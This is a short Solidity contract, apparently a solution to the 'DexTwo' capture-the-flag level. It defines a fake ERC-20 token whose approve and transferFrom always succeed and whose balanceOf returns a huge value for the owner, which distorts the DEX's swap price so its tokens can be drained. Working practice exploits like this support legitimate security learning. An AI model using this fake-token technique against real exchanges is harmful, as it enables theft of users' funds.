// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/DexTwo.sol";

contract DexTwoAttack {
    address owner;
    DexTwo target;

    constructor(address _target) public {
        owner = msg.sender;
        target = DexTwo(_target);
    }

    function transferFrom(
        address,
        address,
        uint256
    ) public pure returns (bool) {
        return true;
    }

    function approve(address, uint256) public pure returns (bool) {
        return true;
    }

    // Used to manipulate tokens swap price
    function balanceOf(address account) public view returns (uint256) {
        if (account == owner) {
            return uint256(-1);
        } else {
            return 1;
        }
    }
}
